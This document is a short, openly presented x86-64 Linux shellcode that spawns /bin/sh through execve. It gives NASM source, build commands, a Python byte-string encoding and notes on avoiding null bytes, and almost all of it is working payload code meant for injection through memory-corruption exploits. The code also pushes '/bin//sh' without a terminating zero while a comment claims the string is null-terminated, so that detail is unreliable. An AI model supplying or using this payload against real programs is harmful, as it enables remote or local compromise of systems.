```nasm
; x86-64 Linux execve("/bin//sh", NULL, NULL)
; 24 bytes, null-free
;
; Build:
;   nasm -f elf64 shell.asm -o shell.o
;   ld shell.o -o shell

section .text
global _start

_start:
    xor  rsi, rsi                   ; argv  = NULL
    mul  rsi                        ; rax   = 0, rdx = 0  (envp = NULL)
    mov  rdi, 0x68732f2f6e69622f    ; "/bin//sh" little-endian, no nulls
    push rdi
    mov  rdi, rsp                   ; rdi   -> "/bin//sh\0" (rsp slot)
    mov  al,  59                    ; rax   = 59 (execve), no null in imm8
    syscall
```

```python
# C-string / Python repr
shellcode = (
    b"\x48\x31\xf6"                         # xor  rsi, rsi
    b"\x48\xf7\xe6"                         # mul  rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"    # mov  rdi, "/bin//"
    b"\x73\x68"                             #             "sh"
    b"\x57"                                 # push rdi
    b"\x48\x89\xe7"                         # mov  rdi, rsp
    b"\xb0\x3b"                             # mov  al,  59
    b"\x0f\x05"                             # syscall
)
```

Key design choices:
- `mul rsi` clears both `rax` and `rdx` in one 3-byte instruction, avoiding two separate `xor`s and keeping both envp and argv NULL.
- `"/bin//sh"` is exactly 8 bytes, filling a qword with no padding zeros needed.
- `mov al, 59` sets the syscall number as an 8-bit immediate — no null byte vs `mov rax, 59` which emits leading zeros.
